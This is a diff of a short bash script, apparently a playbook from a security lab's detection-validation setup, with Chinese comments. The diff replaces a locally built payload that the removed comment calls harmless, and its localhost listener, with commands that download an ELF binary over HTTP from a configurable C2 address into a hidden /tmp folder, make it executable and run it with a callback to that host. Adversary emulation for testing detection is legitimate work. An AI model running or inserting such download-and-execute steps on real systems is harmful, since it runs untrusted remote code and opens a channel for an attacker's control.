@@ -1,9 +1,7 @@
 #!/usr/bin/env bash
-# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
+# attack（窗口内）：从外部源拉取工具 → chmod → 执行回连。
 set -euo pipefail
-HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
-# T1105+T1222.002：外部拉取 → chmod → 执行回连
-STAGING="${SECLAB_STAGING:-/tmp/secval-staging}"; mkdir -p "$STAGING"; "$HERE/common/build.sh" "$STAGING/payload.elf"
-curl -sf -o payload.elf "file://$STAGING/payload.elf" || cp "$STAGING/payload.elf" payload.elf
-chmod 700 payload.elf
-"$HERE/common/with_listener.sh" 8443 ./payload.elf 127.0.0.1 8443
+C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
+curl -sf --max-time 10 -o /tmp/.cache/ingress/payload.elf "http://$C2_IP:18085/tool.elf"
+chmod 700 /tmp/.cache/ingress/payload.elf
+/tmp/.cache/ingress/payload.elf "$C2_IP" 8443
